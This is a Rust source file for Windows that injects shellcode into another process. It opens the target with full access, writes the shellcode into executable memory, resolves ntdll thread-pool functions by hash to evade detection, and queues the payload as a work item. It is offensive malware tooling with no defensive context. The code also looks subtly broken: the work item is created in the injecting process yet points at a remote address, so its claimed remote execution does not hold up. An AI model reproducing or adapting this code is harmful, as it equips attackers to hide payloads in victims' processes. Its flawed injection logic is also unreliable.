#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Memory::{
            VirtualAllocEx, VirtualProtectEx,
            MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
        },
        Diagnostics::Debug::WriteProcessMemory,
        Threading::OpenProcess,
        LibraryLoader::GetModuleHandleA,
    },
    Foundation::CloseHandle,
};

#[cfg(target_os = "windows")]
pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};

    let h_proc = OpenProcess(0x001F_0FFF, 0, target_pid);
    if h_proc == 0 { return false; }

    let remote_buf = VirtualAllocEx(
        h_proc, core::ptr::null(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if remote_buf.is_null() { CloseHandle(h_proc); return false; }

    let mut written: usize = 0;
    WriteProcessMemory(h_proc, remote_buf, shellcode.as_ptr() as _, shellcode.len(), &mut written);

    let mut old = 0u32;
    VirtualProtectEx(h_proc, remote_buf, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    // Resolve TpAllocWork, TpPostWork, TpReleaseWork from ntdll
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
    if ntdll.is_null() { CloseHandle(h_proc); return false; }

    let tp_alloc   = match resolve_by_hash(ntdll, djb2_hash(b"TpAllocWork"))   { Some(p) => p, None => { CloseHandle(h_proc); return false; } };
    let tp_post    = match resolve_by_hash(ntdll, djb2_hash(b"TpPostWork"))    { Some(p) => p, None => { CloseHandle(h_proc); return false; } };
    let tp_release = match resolve_by_hash(ntdll, djb2_hash(b"TpReleaseWork")) { Some(p) => p, None => { CloseHandle(h_proc); return false; } };

    type TpAllocWorkFn   = unsafe extern "system" fn(*mut usize, *mut core::ffi::c_void, *mut core::ffi::c_void, usize) -> i32;
    type TpPostWorkFn    = unsafe extern "system" fn(usize);
    type TpReleaseWorkFn = unsafe extern "system" fn(usize);

    let tp_alloc_fn:   TpAllocWorkFn   = core::mem::transmute(tp_alloc);
    let tp_post_fn:    TpPostWorkFn    = core::mem::transmute(tp_post);
    let tp_release_fn: TpReleaseWorkFn = core::mem::transmute(tp_release);

    let mut work_item: usize = 0;
    tp_alloc_fn(
        &mut work_item,
        core::mem::transmute(remote_buf),
        core::ptr::null_mut(),
        0,
    );

    tp_post_fn(work_item);
    windows_sys::Win32::System::Threading::Sleep(500);
    tp_release_fn(work_item);
    CloseHandle(h_proc);
    true
}
